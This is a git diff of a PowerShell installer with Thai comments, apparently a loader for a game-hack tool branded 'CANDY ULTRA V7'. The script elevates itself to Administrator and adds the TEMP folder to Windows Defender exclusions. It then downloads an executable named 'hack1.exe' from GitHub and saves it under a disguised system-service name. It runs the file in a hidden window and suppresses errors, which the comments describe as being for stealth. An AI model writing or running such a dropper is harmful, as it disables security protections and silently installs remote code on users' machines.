@@ -1,5 +1,5 @@
-# 1. ขอสิทธิ์ Administrator (Self-Elevation)
-# *** สำคัญ: เปลี่ยน URL ด้านล่างเป็นลิงก์ RAW ของไฟล์ install.ps1 ตัวนี้บน GitHub ของคุณ ***
+# 1. [Self-Elevation] ขอสิทธิ์ Administrator อัตโนมัติ
+# *** ก๊อปปี้ RAW Link ของไฟล์ install.ps1 บน GitHub มาใส่ตรงนี้ ***
 $scriptUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/install.ps1"
 
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
@@ -7,25 +7,28 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     exit
 }
 
-# 2. ตั้งค่าความปลอดภัย (ข้ามการสแกนไวรัสในโฟลเดอร์ Temp)
+# 2. [Security] ปิดการสแกนในโฟลเดอร์ Temp เพื่อความลื่นไหล
 Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
 
-# 3. ข้อมูลไฟล์แฮกของคุณ
+# 3. [Configuration] ข้อมูลไฟล์และหน้าควบคุม
 $exeUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/hack1.exe"
-$savePath = "$env:TEMP\WinSystemSvc.exe" # ชื่อไฟล์ที่จะไปแฝงตัวในเครื่อง (ตั้งให้เนียน)
+$savePath = "$env:TEMP\WindowsSvcUpdater.exe"
+$dashboardUrl = "https://creative-bombolone-1e0912.netlify.app/"
 
-# 4. ดาวน์โหลดและเริ่มทำงานแบบซ่อนหน้าต่าง (Silent)
+# 4. [Execution] เริ่มการติดตั้งและรันเงียบๆ
 try {
+    # ดาวน์โหลด Engine
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $exeUrl -OutFile $savePath -UseBasicParsing
     
-    # รันโปรแกรมในพื้นหลังแบบ Hidden
+    # รัน Engine แบบซ่อนหน้าต่างดำ (Silent Mode)
     Start-Process $savePath -WindowStyle Hidden
     
-    # 5. เปิดหน้าเว็บ Dashboard เพื่อให้คุณเริ่มปรับค่า
-    # (เปลี่ยนเป็นลิงก์หน้าเว็บ Dashboard ของคุณ)
-    Start-Process "https://creative-bombolone-1e0912.netlify.app/"
+    # เปิดหน้า Dashboard บน Netlify เพื่อเริ่มคุมค่า
+    Start-Process $dashboardUrl
+    
+    Write-Host "[+] CANDY ULTRA V7: System Synced." -ForegroundColor Green
 }
 catch {
-    # กรณีผิดพลาด
+    # ไม่แสดง Error ให้คนใช้เห็นเพื่อความเนียน
 }
